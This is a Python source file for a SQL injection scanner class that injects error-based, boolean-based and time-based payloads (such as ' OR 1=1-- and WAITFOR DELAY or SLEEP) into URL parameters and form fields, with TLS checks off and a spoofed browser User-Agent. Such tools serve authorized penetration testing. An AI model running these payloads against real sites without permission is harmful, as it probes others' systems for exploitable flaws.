import requests
import urllib.parse
import time
import re
from typing import List, Dict, Any
import random
import string

class SQLInjectionScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # SQL injection payloads
        self.error_based_payloads = [
            "'",
            "''",
            '" OR "1"="1',
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            '" OR 1=1--',
            '" OR 1=1#',
            "') OR ('1'='1",
            '") OR ("1"="1',
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "1' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--",
            "1' AND (SELECT COUNT(*) FROM sysobjects)>0--",
            "1' AND 1=CAST((SELECT COUNT(*) FROM master..sysdatabases) AS INT)--"
        ]
        
        self.boolean_based_payloads = [
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1 AND 1=1",
            "1 AND 1=2",
            "1' AND SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1)='a",
            "1' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))>64--"
        ]
        
        self.time_based_payloads = [
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) AS x) = 3; WAITFOR DELAY '00:00:05'--",
            "1'; IF(1=1) WAITFOR DELAY '00:00:05'--",
            "1' OR SLEEP(5)--",
            "1' OR BENCHMARK(1000000,MD5(1))--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--",
            "1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"
        ]
        
        # SQL error patterns
        self.error_patterns = [
            r"SQL syntax.*?error",
            r"Warning.*?mysql_",
            r"valid MySQL result",
            r"PostgreSQL.*?error",
            r"Warning.*?pg_",
            r"valid PostgreSQL result",
            r"Microsoft Access Driver",
            r"JET Database Engine",
            r"Microsoft OLE DB Provider",
            r"ODBC Microsoft Access Driver",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"Oracle error",
            r"Oracle.*?Driver",
            r"Warning.*?oci_",
            r"Warning.*?ora_",
        ]
    
    def scan_url(self, url: str, params: Dict[str, str] = None) -> Dict[str, Any]:
        """Scan a single URL for SQL injection vulnerabilities"""
        print(f"[+] Scanning SQL Injection: {url}")
        
        vulnerabilities = []
        
        try:
            # Parse URL and extract parameters
            parsed_url = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            # Convert multi-value params to single values
            for key in query_params:
                if isinstance(query_params[key], list):
                    query_params[key] = query_params[key][0]
            
            # If additional params provided, merge them
            if params:
                query_params.update(params)
            
            # Test each parameter
            for param_name in query_params.keys():
                original_value = query_params[param_name]
                
                # Test error-based injection
                error_vuln = self._test_error_based(url, param_name, original_value, query_params)
                if error_vuln:
                    vulnerabilities.append(error_vuln)
                
                # Test boolean-based injection
                boolean_vuln = self._test_boolean_based(url, param_name, original_value, query_params)
                if boolean_vuln:
                    vulnerabilities.append(boolean_vuln)
                
                # Test time-based injection
                time_vuln = self._test_time_based(url, param_name, original_value, query_params)
                if time_vuln:
                    vulnerabilities.append(time_vuln)
            
            # Test POST parameters
            post_vulns = self._test_post_injection(url)
            vulnerabilities.extend(post_vulns)
            
        except Exception as e:
            print(f"[!] Error scanning {url}: {str(e)}")
        
        return {
            'url': url,
            'vulnerable': len(vulnerabilities) > 0,
            'vulnerabilities': vulnerabilities,
            'total_vulnerabilities': len(vulnerabilities)
        }
    
    def _test_error_based(self, url: str, param_name: str, original_value: str, params: Dict) -> Dict[str, Any]:
        """Test for error-based SQL injection"""
        try:
            # Get baseline response
            baseline_response = self.session.get(url, params=params, timeout=10, verify=False)
            baseline_content = baseline_response.text
            
            for payload in self.error_based_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(url, params=test_params, timeout=10, verify=False)
                    
                    # Check for SQL errors
                    for pattern in self.error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            return {
                                'type': 'Error-based SQL Injection',
                                'parameter': param_name,
                                'payload': payload,
                                'method': 'GET',
                                'evidence': self._extract_error_evidence(response.text),
                                'severity': 'High',
                                'confidence': 'High'
                            }
                    
                    # Check for significant content differences
                    if self._significant_difference(baseline_content, response.text):
                        return {
                            'type': 'Potential SQL Injection (Content Change)',
                            'parameter': param_name,
                            'payload': payload,
                            'method': 'GET',
                            'evidence': 'Significant response content change detected',
                            'severity': 'Medium',
                            'confidence': 'Medium'
                        }
                
                except requests.exceptions.RequestException:
                    continue
                
        except Exception as e:
            print(f"[!] Error in error-based test: {str(e)}")
        
        return None
    
    def _test_boolean_based(self, url: str, param_name: str, original_value: str, params: Dict) -> Dict[str, Any]:
        """Test for boolean-based blind SQL injection"""
        try:
            # Test true and false conditions
            true_payload = f"{original_value}' AND '1'='1"
            false_payload = f"{original_value}' AND '1'='2"
            
            # Get responses for both conditions
            true_params = params.copy()
            true_params[param_name] = true_payload
            
            false_params = params.copy()
            false_params[param_name] = false_payload
            
            try:
                true_response = self.session.get(url, params=true_params, timeout=10, verify=False)
                false_response = self.session.get(url, params=false_params, timeout=10, verify=False)
                
                # Compare responses
                if (true_response.status_code == 200 and 
                    false_response.status_code != 200 and
                    len(true_response.text) != len(false_response.text)):
                    
                    return {
                        'type': 'Boolean-based Blind SQL Injection',
                        'parameter': param_name,
                        'payload': true_payload,
                        'method': 'GET',
                        'evidence': f'True condition: {len(true_response.text)} chars, False condition: {len(false_response.text)} chars',
                        'severity': 'High',
                        'confidence': 'Medium'
                    }
            
            except requests.exceptions.RequestException:
                pass
                
        except Exception as e:
            print(f"[!] Error in boolean-based test: {str(e)}")
        
        return None
    
    def _test_time_based(self, url: str, param_name: str, original_value: str, params: Dict) -> Dict[str, Any]:
        """Test for time-based blind SQL injection"""
        try:
            # Get baseline response time
            start_time = time.time()
            baseline_response = self.session.get(url, params=params, timeout=15, verify=False)
            baseline_time = time.time() - start_time
            
            for payload in self.time_based_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    start_time = time.time()
                    response = self.session.get(url, params=test_params, timeout=15, verify=False)
                    response_time = time.time() - start_time
                    
                    # Check if response was significantly delayed
                    if response_time > baseline_time + 4:  # 4+ second delay indicates time-based injection
                        return {
                            'type': 'Time-based Blind SQL Injection',
                            'parameter': param_name,
                            'payload': payload,
                            'method': 'GET',
                            'evidence': f'Response delayed by {response_time - baseline_time:.2f} seconds',
                            'severity': 'High',
                            'confidence': 'High'
                        }
                
                except requests.exceptions.RequestException as e:
                    # Timeout might also indicate successful injection
                    if "timed out" in str(e):
                        return {
                            'type': 'Time-based Blind SQL Injection (Timeout)',
                            'parameter': param_name,
                            'payload': payload,
                            'method': 'GET',
                            'evidence': 'Request timed out, indicating potential SQL injection',
                            'severity': 'High',
                            'confidence': 'Medium'
                        }
                
        except Exception as e:
            print(f"[!] Error in time-based test: {str(e)}")
        
        return None
    
    def _test_post_injection(self, url: str) -> List[Dict[str, Any]]:
        """Test POST parameters for SQL injection"""
        vulnerabilities = []
        
        try:
            # Get the page to find forms
            response = self.session.get(url, timeout=10, verify=False)
            forms = self._extract_forms(response.text)
            
            for form in forms:
                for field_name in form.get('fields', []):
                    # Test a few error-based payloads for POST
                    for payload in self.error_based_payloads[:5]:
                        vuln = self._test_post_field(form['action'], field_name, payload, form['fields'])
                        if vuln:
                            vulnerabilities.append(vuln)
                            break
        
        except Exception as e:
            print(f"[!] Error testing POST injection: {str(e)}")
        
        return vulnerabilities
    
    def _test_post_field(self, action_url: str, field_name: str, payload: str, all_fields: Dict) -> Dict[str, Any]:
        """Test a specific POST field for SQL injection"""
        try:
            # Prepare POST data
            post_data = all_fields.copy()
            post_data[field_name] = payload
            
            # Make POST request
            response = self.session.post(action_url, data=post_data, timeout=10, verify=False)
            
            # Check for SQL errors
            for pattern in self.error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return {
                        'type': 'Error-based SQL Injection (POST)',
                        'parameter': field_name,
                        'payload': payload,
                        'method': 'POST',
                        'evidence': self._extract_error_evidence(response.text),
                        'severity': 'High',
                        'confidence': 'High'
                    }
        
        except Exception as e:
            print(f"[!] Error testing POST field {field_name}: {str(e)}")
        
        return None
    
    def _extract_error_evidence(self, response_text: str) -> str:
        """Extract SQL error evidence from response"""
        for pattern in self.error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                # Get some context around the match
                start = max(0, match.start() - 50)
                end = min(len(response_text), match.end() + 50)
                return response_text[start:end].strip()
        
        return "SQL error detected in response"
    
    def _significant_difference(self, content1: str, content2: str) -> bool:
        """Check if there's a significant difference between two responses"""
        len_diff = abs(len(content1) - len(content2))
        return len_diff > 100  # Significant if difference is > 100 characters
    
    def _extract_forms(self, html_content: str) -> List[Dict[str, Any]]:
        """Extract forms from HTML content"""
        forms = []
        
        # Simple regex to find forms
        form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
        input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
        
        for form_match in re.finditer(form_pattern, html_content, re.IGNORECASE | re.DOTALL):
            action = form_match.group(1)
            form_content = form_match.group(2)
            
            # Find input fields
            fields = {}
            for input_match in re.finditer(input_pattern, form_content, re.IGNORECASE):
                field_name = input_match.group(1)
                fields[field_name] = "test_value"
            
            if fields:
                forms.append({
                    'action': action,
                    'fields': fields
                })
        
        return forms
    
    def scan_multiple_urls(self, urls: List[str]) -> List[Dict[str, Any]]:
        """Scan multiple URLs for SQL injection vulnerabilities"""
        results = []
        
        print(f"[*] Scanning {len(urls)} URLs for SQL injection...")
        
        for url in urls:
            result = self.scan_url(url)
            results.append(result)
            
            if result['vulnerable']:
                print(f"[!] SQL injection vulnerability found: {url}")
            
            # Small delay to avoid overwhelming the target
            time.sleep(0.5)
        
        return results
